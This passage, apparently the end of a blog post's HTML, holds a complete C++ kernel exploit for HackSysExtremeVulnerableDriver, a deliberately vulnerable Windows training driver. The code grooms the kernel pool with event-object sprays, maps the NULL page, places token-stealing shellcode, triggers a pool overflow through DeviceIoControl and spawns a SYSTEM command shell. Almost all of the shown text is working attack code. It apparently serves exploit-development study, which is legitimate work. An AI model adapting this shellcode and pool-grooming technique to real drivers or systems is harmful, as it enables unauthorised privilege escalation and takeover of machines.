<span class="n">vector</span><span class="o">&lt;</span><span class="n">HANDLE</span><span class="o">&gt;</span> <span class="n">defragment_handles</span><span class="p">;</span>
<span class="n">vector</span><span class="o">&lt;</span><span class="n">HANDLE</span><span class="o">&gt;</span> <span class="n">sequential_handles</span><span class="p">;</span>

<span class="n">HANDLE</span> <span class="nf">grab_handle</span><span class="p">()</span> <span class="p">{</span>

    <span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="n">DEVICE_NAME</span><span class="p">,</span>
        <span class="n">FILE_READ_ACCESS</span> <span class="o">|</span> <span class="n">FILE_WRITE_ACCESS</span><span class="p">,</span>
        <span class="n">FILE_SHARE_READ</span> <span class="o">|</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="n">OPEN_EXISTING</span><span class="p">,</span>
        <span class="n">FILE_FLAG_OVERLAPPED</span> <span class="o">|</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] No handle to HackSysExtremeVulnerableDriver</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Grabbed handle to HackSysExtremeVulnerableDriver: "</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span>
        <span class="o">&lt;&lt;</span> <span class="n">hFile</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>

    <span class="k">return</span> <span class="n">hFile</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">spray_pool</span><span class="p">()</span> <span class="p">{</span>

    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Spraying pool to defragment...</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">HANDLE</span> <span class="n">result</span> <span class="o">=</span> <span class="n">CreateEvent</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="s">L""</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] Error allocating Event Object during defragmentation</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">defragment_handles</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Defragmentation spray complete.</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Spraying sequential allocations...</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">HANDLE</span> <span class="n">result</span> <span class="o">=</span> <span class="n">CreateEvent</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="s">L""</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] Error allocating Event Object during sequential.</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">sequential_handles</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Sequential spray complete.</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>

    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Poking 0x200 byte-sized holes in our sequential allocation...</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">sequential_handles</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mh">0x16</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">x</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">BOOL</span> <span class="n">freed</span> <span class="o">=</span> <span class="n">CloseHandle</span><span class="p">(</span><span class="n">sequential_handles</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="n">x</span><span class="p">]);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">freed</span> <span class="o">==</span> <span class="nb">false</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] Unable to free sequential allocation!</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
                <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] Last error: "</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
                <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Holes poked lol.</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">allocate_shellcode</span><span class="p">()</span> <span class="p">{</span>

    <span class="n">_NtAllocateVirtualMemory</span> <span class="n">NtAllocateVirtualMemory</span> <span class="o">=</span>
        <span class="p">(</span><span class="n">_NtAllocateVirtualMemory</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span>
            <span class="s">"NtAllocateVirtualMemory"</span><span class="p">);</span>

    <span class="n">INT64</span> <span class="n">address</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="mh">0x100</span><span class="p">;</span>

    <span class="n">HANDLE</span> <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="n">NtAllocateVirtualMemory</span><span class="p">(</span>
        <span class="n">GetCurrentProcess</span><span class="p">(),</span>
        <span class="p">(</span><span class="n">PVOID</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">address</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="p">(</span><span class="n">PSIZE_T</span><span class="p">)</span><span class="o">&amp;</span><span class="n">size</span><span class="p">,</span>
        <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span>
        <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] Unable to allocate NULL page...wtf?</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] Last error: "</span> <span class="o">&lt;&lt;</span> <span class="n">dec</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] NULL page mapped.</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Placing pointer to shellcode on NULL page at offset 0x60...</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>

    <span class="n">BYTE</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">(</span>
        <span class="s">"</span><span class="se">\x60</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x64\xA1\x24\x01\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x8B\x40\x50</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x89\xC1</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x8B\x98\xF8\x00\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\xBA\x04\x00\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x8B\x80\xB8\x00\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x2D\xB8\x00\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x39\x90\xB4\x00\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x75\xED</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x8B\x90\xF8\x00\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x89\x91\xF8\x00\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x61</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\xC2\x10\x00</span><span class="s">"</span>  <span class="c1">// ret 0x10</span>
        <span class="p">);</span>

    <span class="n">LPVOID</span> <span class="n">shellcode_addr</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span>
        <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span>
        <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span>
        <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>

    <span class="n">memset</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span> <span class="sc">'\x00'</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="mh">0x60</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">shellcode_addr</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">send_payload</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hFile</span><span class="p">)</span> <span class="p">{</span>

    <span class="n">ULONG</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="mh">0x220</span><span class="p">;</span>

    <span class="n">BYTE</span><span class="o">*</span> <span class="n">input_buff</span> <span class="o">=</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span>
        <span class="n">payload_len</span> <span class="o">+</span> <span class="mh">0x1</span><span class="p">,</span>
        <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span>
        <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

    <span class="n">BYTE</span> <span class="n">overwrite_payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">(</span>
        <span class="s">"</span><span class="se">\x40\x00\x08\x04</span><span class="s">"</span>  <span class="c1">// pool header</span>
        <span class="s">"</span><span class="se">\x45\x76\x65\xee</span><span class="s">"</span>  <span class="c1">// pool tag</span>
        <span class="s">"</span><span class="se">\x00\x00\x00\x00</span><span class="s">"</span>  <span class="c1">// obj header quota begin</span>
        <span class="s">"</span><span class="se">\x40\x00\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x00\x00\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x00\x00\x00\x00</span><span class="s">"</span>  <span class="c1">// obj header quota end</span>
        <span class="s">"</span><span class="se">\x01\x00\x00\x00</span><span class="s">"</span>  <span class="c1">// obj header begin</span>
        <span class="s">"</span><span class="se">\x01\x00\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x00\x00\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x00\x00\x08\x00</span><span class="s">"</span> <span class="c1">// 0xc converted to 0x0</span>
        <span class="p">);</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">input_buff</span><span class="p">,</span> <span class="sc">'\x41'</span><span class="p">,</span> <span class="mh">0x1F8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">input_buff</span> <span class="o">+</span> <span class="mh">0x1F8</span><span class="p">,</span> <span class="n">overwrite_payload</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">);</span>

    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Sending buffer size of: "</span> <span class="o">&lt;&lt;</span> <span class="n">dec</span> <span class="o">&lt;&lt;</span> <span class="n">payload_len</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>

    <span class="n">DWORD</span> <span class="n">bytes_ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span>
        <span class="n">IOCTL</span><span class="p">,</span>
        <span class="n">input_buff</span><span class="p">,</span>
        <span class="n">payload_len</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="o">&amp;</span><span class="n">bytes_ret</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] DeviceIoControl failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">free_chunks</span><span class="p">()</span> <span class="p">{</span>

    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Freeing defragmentation allocations...</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">defragment_handles</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">BOOL</span> <span class="n">freed</span> <span class="o">=</span> <span class="n">CloseHandle</span><span class="p">(</span><span class="n">defragment_handles</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">freed</span> <span class="o">==</span> <span class="nb">false</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">//cout &lt;&lt; "[!] Unable to free defragment allocation!\n";</span>
            <span class="c1">//cout &lt;&lt; "[!] Last error: " &lt;&lt; GetLastError() &lt;&lt; "\n";</span>
            <span class="c1">//exit(1);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Defragmentation allocations freed.</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Freeing sequential allocations...</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">sequential_handles</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">BOOL</span> <span class="n">freed</span> <span class="o">=</span> <span class="n">CloseHandle</span><span class="p">(</span><span class="n">sequential_handles</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">freed</span> <span class="o">==</span> <span class="nb">false</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">//cout &lt;&lt; "[!] Unable to free defragment allocation!\n";</span>
            <span class="c1">//cout &lt;&lt; "[!] Last error: " &lt;&lt; GetLastError() &lt;&lt; "\n";</span>
            <span class="c1">//exit(1);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Sequential allocations freed.</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">spawn_shell</span><span class="p">()</span> <span class="p">{</span>

    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Spawning nt authority/system shell...</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>

    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>
    <span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pi</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pi</span><span class="p">));</span>

    <span class="n">STARTUPINFOA</span> <span class="n">si</span><span class="p">;</span>
    <span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">));</span>

    <span class="n">CreateProcessA</span><span class="p">(</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">cmd.exe"</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span>
        <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>

    <span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="n">grab_handle</span><span class="p">();</span>

    <span class="n">spray_pool</span><span class="p">();</span>

    <span class="n">allocate_shellcode</span><span class="p">();</span>

    <span class="n">send_payload</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>

    <span class="n">free_chunks</span><span class="p">();</span>

    <span class="n">spawn_shell</span><span class="p">();</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

</article>
      </section>
    </div>
  </div>
</body>

</html>
